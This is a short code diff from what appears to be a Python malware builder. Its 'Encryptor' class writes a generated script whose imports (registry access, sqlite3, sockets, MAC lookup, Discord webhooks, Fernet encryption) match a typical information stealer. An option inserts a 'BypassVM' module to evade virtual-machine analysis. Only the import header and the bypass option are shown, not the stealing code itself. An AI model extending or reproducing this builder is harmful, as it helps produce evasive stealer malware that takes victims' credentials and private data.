@@ -24,17 +24,15 @@ class Encryptor:
             plaintext = f.read()
         enc = self.encrypt(plaintext, self.key)
         with open(self.file_name, 'w') as f:
-            f.write("""import base64
-import codecs
-import requests
+            f.write("""import requests
 import os
 import json
+import base64
 import winreg
 import shutil
 import psutil
 import random
 import zipfile
-import hashlib
 import socket
 import sqlite3
 import platform
@@ -54,7 +52,8 @@ from re import findall, match
 from urllib.request import urlopen
 from discord import File, Webhook, RequestsWebhookAdapter
 from discord_webhook import DiscordWebhook, DiscordEmbed
-from getmac import get_mac_address as gma""")
+from getmac import get_mac_address as gma
+from cryptography.fernet import Fernet""")
             if self.bypassVM == "y":
                 f.write("import BypassVM\n")
                 f.write("\nbypass = BypassVM.BypassVM()\n")
